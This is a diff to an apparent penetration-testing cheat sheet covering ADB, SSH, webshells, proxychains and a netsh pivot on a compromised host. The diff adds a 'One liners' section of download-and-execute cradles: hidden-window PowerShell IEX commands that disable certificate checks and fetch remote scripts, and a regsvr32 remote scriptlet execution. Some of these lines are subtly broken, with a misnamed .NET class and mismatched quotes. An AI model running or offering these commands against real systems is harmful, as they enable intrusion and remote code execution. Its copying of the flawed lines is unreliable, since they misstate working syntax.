@@ -415,7 +415,7 @@ ADB stuff:\
 `adb uninstall com.example.android`\
 `adb install compiled-signed.apk`\
 
-Signing the APK: ``
+Signing the APK: `TO DO`
 
 ## SSH/SCP
 
@@ -441,7 +441,7 @@ Copy from one ssh host to another ssh host (not yours): ` scp user@remote-host.c
 ## Shells
 
 ### Web
-Webshells http://tools.kali.org/maintaining-access/webshells : `Kali webshells: /usr/share/webshells`
+Webshells http://tools.kali.org/maintaining-access/webshells: `Kali webshells: /usr/share/webshells`
 Weevely
 
 ### Executables
@@ -471,11 +471,14 @@ Config file: eg `pivot.conf`\
 
 Usage: `proxychains4 -f ./pivot.conf wget http://remote-network-target-host.com`\
 DNS Resolution: `proxyresolv www.target-host.com`\
-Specify alternate configuration:`-f`\
+Specify alternate configuration:`-f`
 
 ### Netsh pivot
-on the compromised host: `netsh interface portproxy add v4tov4 listenport=33389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.44`\
+on the compromised host: `netsh interface portproxy add v4tov4 listenport=33389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.44`
 
 ### PLink on Windows
 
-
+## One liners
+Powershell: `powershell -w hidden -c "[System.Net.SystemPointManager]::ServerCertificateValidationCallback = { $true }; IEX ((new-object net.webclient).downloadstring('https://target/tools'))"`\
+PowerShell IWR: `powershell.exe –c “IEX (Invoke-WebRequest -SkipCertificateCheck -Method 'GET' -Uri 'https://target/tools')`\
+RegSvr32: `regsvr32.exe /s /n /u /i:http://server/file.sct scrobj.dll`\
